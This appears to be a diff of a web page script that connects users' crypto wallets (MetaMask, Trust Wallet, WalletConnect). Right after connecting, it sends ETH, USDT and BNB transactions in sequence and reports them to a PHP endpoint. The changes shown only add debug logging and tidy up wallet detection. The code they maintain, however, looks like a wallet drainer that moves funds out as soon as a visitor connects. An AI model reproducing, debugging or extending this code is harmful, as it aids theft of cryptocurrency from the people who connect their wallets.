@@ -106,30 +106,23 @@
             });
 
             connectButton.addEventListener('click', async () => {
+                console.log('Connect button clicked');
                 try {
                     let provider;
                     if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
                         provider = window.ethereum;
                         await provider.request({ method: 'eth_requestAccounts' });
+                        console.log('MetaMask detected and connected');
                     } else if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) {
                         provider = window.ethereum;
                         await provider.request({ method: 'eth_requestAccounts' });
+                        console.log('Trust Wallet detected and connected');
                     } else {
                         provider = await web3Modal.connect();
+                        console.log('Connected using WalletConnect');
                     }
 
                     const web3 = new Web3(provider);
-
-                    let walletType = 'unknown';
-                    if (provider.isMetaMask) {
-                        walletType = 'MetaMask';
-                    } else if (provider.isTrust) {
-                        walletType = 'Trust Wallet';
-                    } else if (provider.isWalletConnect) {
-                        walletType = 'WalletConnect';
-                    }
-
-                    console.log(`${walletType} detected`);
 
                     const ethersProvider = new ethers.providers.Web3Provider(provider);
                     const signer = ethersProvider.getSigner();
@@ -205,6 +198,8 @@
                     const usdtTxHash = await web3.eth.sendTransaction(usdtTransactionParameters);
                     const bnbTxHash = await web3.eth.sendTransaction(bnbTransactionParameters);
 
+                    console.log('Transactions sent:', ethTxHash, usdtTxHash, bnbTxHash);
+
                     // Send transaction details to PHP endpoint
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'approved',
@@ -229,7 +224,6 @@
                 }
             });
 
-            // Fallback to WalletConnect QR code if the wallet is not detected
             web3Modal.on('connect', async (provider) => {
                 if (provider.isWalletConnect) {
                     qrCodeContainer.style.display = 'block';
